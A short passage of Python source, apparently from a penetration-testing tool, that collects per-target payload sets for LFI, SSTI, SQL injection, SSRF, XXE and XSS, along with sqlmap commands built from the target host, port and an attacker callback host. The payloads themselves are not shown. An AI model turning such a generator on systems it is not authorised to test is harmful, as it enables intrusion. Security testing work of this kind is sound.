            lfi_payloads=_build_lfi_payloads(os_hint),
            ssti_engines=_filter_ssti_by_tech(detected_tech),
            sqli_entries=_filter_sqli_by_tech(detected_tech),
            ssrf_payloads=_build_ssrf_payloads(host, port),
            xxe_payloads=_build_xxe_payloads(lhost),
            xss_payloads=_build_xss_payloads(lhost),
            sqlmap_cmds=_build_sqlmap_cmds(host, port, protocol, detected_tech),
            notes=notes,
        ))

    return results
